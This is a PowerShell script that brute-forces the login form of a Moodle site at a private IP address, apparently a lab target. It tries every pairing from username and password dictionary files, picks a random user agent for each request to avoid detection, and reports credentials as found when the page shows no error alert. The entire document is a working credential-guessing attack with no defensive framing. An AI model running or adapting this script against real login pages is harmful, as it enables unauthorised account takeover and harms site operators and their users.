#Read files
$userAgentFilePath = "./agents.txt"
$allUserAgents = [System.IO.File]::ReadAllLines($userAgentFilePath)

$userFilePath = "./usersDictionary.txt"
$allUsers = [System.IO.File]::ReadAllLines($userFilePath)

$passwordFilePath = "./passwordsDictionary.txt"
$allPasswords = [System.IO.File]::ReadAllLines($passwordFilePath)

#Web-Request
$URI = [System.uri]::new("http://192.168.160.161/moodle/login/index.php")
$method = [Microsoft.PowerShell.Commands.WebRequestMethod]:: "POST"
$maximumRedirection = [System.Int32] 1

$userCount = 0
$passwordCount = 0
$totalIterations = $allUsers.count * $allPasswords.count


foreach($username in $allUsers){
    $userCount ++
    foreach($password in $allPasswords){
        $passwordCount ++
        Write-Host -ForegroundColor Yellow "[+][$passwordCount/$totalIterations] Testing Username: " -NoNewline
        Write-Host -ForegroundColor Cyan "$username" -NoNewline
        Write-Host -ForegroundColor Yellow " / Password: " -NoNewline
        Write-Host -ForegroundColor magenta "$password"
        
        

        $body = "anchor=&username=$username&password=$password"
        try{
            $randomAgent = Get-Random -Maximum $allUserAgents.count
            $response = Invoke-WebRequest -Uri $URI -Method $method -MaximumRedirection $maximumRedirection -Body $body -ErrorAction Ignore -UserAgent $allUserAgents[$randomAgent]
            $elements =  @($response.ParsedHtml.body.getElementsByClassName('alert alert-danger')).count
            if($elements -eq 0){
                 Write-Host -ForegroundColor Green "[+]CREDITIALS FOUND!!! username:: $username / password:: $password"
                 break
            } 
        }catch{
            Write-Host $_
        }
    }
}
